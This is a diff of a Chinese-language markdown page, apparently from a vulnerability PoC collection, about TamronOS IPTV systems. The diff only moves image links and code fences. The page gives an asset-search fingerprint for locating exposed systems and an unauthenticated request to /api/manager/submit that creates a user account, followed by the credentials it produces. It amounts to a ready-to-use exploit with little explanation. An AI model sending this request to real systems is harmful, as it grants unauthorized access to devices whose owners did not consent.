@@ -20,31 +20,19 @@ app="TamronOS-IPTV系统"
 
 登录页面如下
 
-
-
-![](images/202202101926166.png)
-
-
+![](../.gitbook/assets/202202101926166.png)
 
 ## 漏洞POC为
 
-
-
-```plain
+```
 /api/manager/submit?group=1&username=test&password=123456
 ```
 
+![](../.gitbook/assets/202202101926524.png)
 
-
-![](images/202202101926524.png)
-
-
-
-```plain
+```
 user: test
 pass: 123456
 ```
 
-
-
-![](images/202202101926288.png)
+![](../.gitbook/assets/202202101926288.png)
